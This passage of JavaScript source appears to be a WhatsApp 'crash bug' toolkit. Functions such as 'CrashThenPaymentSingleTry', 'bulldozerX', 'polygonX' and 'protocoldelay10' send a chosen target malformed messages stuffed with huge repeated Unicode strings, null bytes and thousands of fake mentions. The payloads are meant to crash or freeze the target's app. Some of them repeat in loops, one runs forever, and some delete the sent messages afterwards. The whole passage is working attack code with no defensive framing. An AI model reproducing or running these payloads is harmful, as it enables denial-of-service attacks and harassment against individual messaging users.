            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝕶4𝖊𝖟𝖆𝖗𝕴𝖃" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 6000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function CrashThenPaymentSingleTry(target) {
  try {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 2.9990000000,
        degreesLongitude: -2.9990000000,
        name: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆˙" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
        url: `https://` + `𑇂𑆵𑆴𑆿`.repeat(1817) + `.com`
      }
    }, {
      participant: {
        jid: target
      }
    });
    await sock.relayMessage(target, {
      paymentInviteMessage: {
        serviceType: "PAYMENT",
        expiryTimestamp: Math.floor(Math.random() * -20000000),
      },
    }, {
      participant: {
        jid: target,
      },
    });

  } catch (error) {
  }
}

async function LoadInvisIphone(sock, target) {
  const AddressPayload = {
    locationMessage: {
      degreesLatitude: 1999-1999917739,
      degreesLongitude: -11.81992828899,
      name: " ⎋꙱" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://eporner.com",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "Join New Group" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "1s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, AddressPayload, {
    participant: { jid: target }
  });
}

//

async function bulldozerX(target) {
  await sock.relayMessage(
    target,
    {
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
      },
      eventMessage: {
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          }
        },
        isCanceled: true,
        name: "⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆",
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
        startTime: "1764032400",
        extraGuestsAllowed: true,
        isScheduleCall: true
      }
    },
    { participant: { jid: target } }
  );
}

async function invisXAlbum(sock, target) {
  try {
    const locationMemex = {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
          hydratedFooterText: "",
          locationMessage: {
            degreesLatitude: -6.2088,
            degreesLongitude: 106.8456,
            name: "",
            address: ""
          },
          hydratedButtons: [
            {
              index: 1,
              urlButton: {
                displayText: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
                url: "https://www.google.com/maps?q=-6.2088,106.8456"
              }
            }
          ]
        }
      }
    };

    const msgLoc = generateWAMessageFromContent(target, locationMemex, {});
    await sock.relayMessage(target, msgLoc.message, { messageId: msgLoc.key.id });

    const images = [
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg",
      "https://files.catbox.moe/9x3f0p.jpg",
      "https://files.catbox.moe/jd4y8t.jpg",
      "https://files.catbox.moe/qn3j8l.jpg",
      "https://files.catbox.moe/5m1x6h.jpg",
      "https://files.catbox.moe/2j9nzg.jpg"
    ];

    for (const [i, url] of images.entries()) {
      await sock.sendMessage(
        target,
        {
          image: { url },
          caption: "\u200B".repeat(50000) + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000)
        }
      );
    }

  } catch (err) {
  }
}

//

async function polygonX(target) {
  const randomArray = Array.from(
    { length: 1900 },
    () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
  );

  const image = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.15575-24/30655212_1596965484788292_325491161031321296_n.enc?ccb=11-4&oh=01_Q5Aa3AEFLlS4vcacOgPLKuwa04U5Fso3suvix_Iw-1l6zqVSJw&oe=694ADB37&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "+D8Vqzu+QxY7UOZJT+QhJlot2JhYJguhySEOYQK7TVI=",
      fileLength: "287465",
      height: 128,
      width: 128,
      mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
      contextInfo: {
        mentionedJid: [target, ...randomArray],
        isSampled: true,
        participant: target,
        forwardingScore: 9741,
        isForwarded: true
      }
    }
  };

  const catalogMsg = generateWAMessageFromContent(
    target,
    {
      catalogMessage: {
        title: " ",
        body: "K4ezarIX",
        footer: " ",
        contextInfo: {
          mentionedJid: [target, ...randomArray],
          isForwarded: true
        },
        products: [
          {
            productId: "1",
            title: " ",
            description: "⋆｡°✩ ⋆｡°✩𝑭𝒐𝒓𝑽𝒊𝒔𝒊𝒃𝒍𝒆𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄✩°｡⋆✩°｡⋆",
            currencyCode: "USD",
            priceAmount1000: 999000,
            retailerId: "retailer_1",
            url: "https://xnxx.com",
            productImageCount: 1,
            productImages: [
              {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.15575-24/30655212_1596965484788292_325491161031321296_n.enc?ccb=11-4&oh=01_Q5Aa3AEFLlS4vcacOgPLKuwa04U5Fso3suvix_Iw-1l6zqVSJw&oe=694ADB37&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg"
                }
              }
            ]
          }
        ]
      }
    },
    { userJid: sock.user?.id }
  );

  await sock.relayMessage(target, catalogMsg.message, {
    messageId: catalogMsg.key.id
  });

  const newsletterMsg = generateWAMessageFromContent(
    target,
    {
      newsletterForward: {
        message: {
          groupStatusMessageV2: {
            message: {
              ephemeralMessage: {
                message: {
                  viewOnceMessage: {
                    message: image
                  }
                },
                ephemeralExpiration: 259200
              }
            },
            contextInfo: {
              pairedMediaType: "NOT_PAIRED_MEDIA"
            },
            annotations: [
              {
                polygonVertices: [
                  { x: 60.7, y: -36.39 },
                  { x: -16.71, y: 49.26 },
                  { x: -56.58, y: 37.85 },
                  { x: 20.84, y: -47.80 }
                ],
                newsletter: {
                  newsletterJid: "0@newsletter",
                  newsletterName: "K4ezarIX",
                  contentType: "UPDATE",
                  accessibilityText: ""
                }
              }
            ]
          }
        },
        newsletterJid: "0@newsletter",
        newsletterName: "K4ezarIX",
        serverMessageId: 123456789,
        contextInfo: {
          isForwarded: true
        }
      }
    },
    { userJid: sock.user?.id }
  );

  await sock.relayMessage(target, newsletterMsg.message, {
    messageId: newsletterMsg.key.id,
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  await sock.sendMessage(target, {
    delete: {
      id: newsletterMsg.key.id,
      participant: target,
      remoteJid: target,
      fromMe: true
    }
  });

  if (mention) {
    const paymentInviteMsg = generateWAMessageFromContent(
      target,
      {
        paymentInviteMessage: {
          serviceType: "WHATSWAPP",
          expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
          invitationType: "REQUEST",
          noteMessage: {
            extendedTextMessage: {
              text: "K4ezarIX",
              contextInfo: {
                mentionedJid: [target, ...randomArray],
                isForwarded: true
              }
            }
          },
          amount: {
            value: "1",
            offset: 0,
            currencyCode: "USD"
          },
          background: {
            type: "DEFAULT"
          }
        }
      },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage(
      target,
      paymentInviteMsg.message,
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_mention: "\u0000".repeat(50000),
              position: "1"
            },
            content: undefined
          }
        ]
      }
    );

    await sock.sendMessage(target, {
      delete: {
        id: paymentInviteMsg.key.id,
        participant: target,
        remoteJid: target,
        fromMe: true
      }
    });

    const stickerMsg = {
      sticker: { 
        url: "https://mmg.whatsapp.net/v/t62.15575-24/30655212_1596965484788292_325491161031321296_n.enc?ccb=11-4&oh=01_Q5Aa3AEFLlS4vcacOgPLKuwa04U5Fso3suvix_Iw-1l6zqVSJw&oe=694ADB37&_nc_sid=5e03e0&mms3=true" 
      },
      contextInfo: {
        mentionedJid: [target, ...randomArray],
        isSampled: true,
        participant: target,
        forwardingScore: 9741,
        isForwarded: true
      }
    };

    const polygonstc = await sock.sendMessage(target, stickerMsg);
    await sock.sendMessage(target, {
      delete: {
        id: polygonstc.key.id,
        participant: target,
        remoteJid: target,
        fromMe: true
      }
    });
  }
}

async function protocoldelay10(sock, target, mention = true) {
  while (true) {
    const sticker = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
        mimetype: "image/webp",
        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
        fileLength: 1173741,
        mediaKeyTimestamp: Date.now(),
        isAnimated: true
      }
    };

    const msgSticker = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: sticker, ephemeralExpiration: 259200 } },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msgSticker.message, {
      messageId: msgSticker.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      {
        ephemeralMessage: {
          message: { viewOnceMessage: { message: image } },
          ephemeralExpiration: 259200
        }
      },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    const documentPayload = {
      documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/546070134_1487354876439973_4934366613744511451_n.enc?ccb=11-4&oh=01_Q5Aa3AHZ25X4h4cEiDw5S7ikFqbvcfasFd5bt7ERcpGKuq0GNg&oe=695046D5&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/json",
        fileSha256: "epXLk8bPeY1T3Qifs7Ue7WbyFWcA0qfQ0HyLVeFddnI=",
        fileLength: "14",
        pageCount: 0,
        mediaKey: "bWsJTES/rTf/vD5lj5BheCyLEhfgraMT1nS90JfN6Xk=",
        fileName: "Xyraa Cantikkk.json",
        fileEncSha256: "szNhyOWFuDNL7EhYqO8bg9V5ftmWG4u0BNXrDSWO+UM=",
        directPath: "/v/t62.7119-24/546070134_1487354876439973_4934366613744511451_n.enc?ccb=11-4&oh=01_Q5Aa3AHZ25X4h4cEiDw5S7ikFqbvcfasFd5bt7ERcpGKuq0GNg&oe=695046D5&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1764290199",
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: false
          }
        }
      },
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "kaPH00df40NOuiL8ZTz7kZc3yUx6Qqbh7YGiVhKUmPk="
      }
    };

    const msgDoc = generateWAMessageFromContent(
      "status@broadcast",
      {
        ephemeralMessage: {
          message: { viewOnceMessage: { message: documentPayload } },
          ephemeralExpiration: 259200
        }
      },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msgDoc.message, {
      messageId: msgDoc.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(50000) },
              content: undefined
            }
          ]
        }
      );
    }
  }
}

async function OtaxAyunBelovedX(sock, target) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ⋆｡°✩ ⋆｡°✩𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄𝑭𝒐𝒓𝑲𝟒𝒆𝒛𝒂𝒓𝑰𝑿✩°｡⋆✩°｡⋆ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`${target} 饾檸饾櫄饾櫃饾櫀饾櫍饾櫆 饾樋饾櫈 饾檧饾櫖饾櫄 饾檧饾櫖饾櫄 饾檴饾櫋饾櫄饾櫇 饾檴饾檹饾樇饾檽 飧檂`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
